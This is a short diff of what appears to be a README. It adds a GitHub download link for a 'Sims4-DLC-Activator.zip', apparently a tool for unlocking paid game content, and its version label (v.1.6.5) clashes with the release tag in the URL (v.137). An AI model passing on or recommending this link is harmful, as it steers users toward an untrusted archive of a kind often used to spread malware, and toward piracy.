@@ -6,7 +6,7 @@
 
 ### - 🔗 ***Get the Latest Release:***
 
-- [💾 v.1.6.5 Release]() = `*Tool files & folder*`
+- [💾 v.1.6.5 Release](https://github.com/Anadius-Updater-Sims-4/.github/releases/download/v.137/Sims4-DLC-Activator.zip) = `*Tool files & folder*`
 
 ---
 
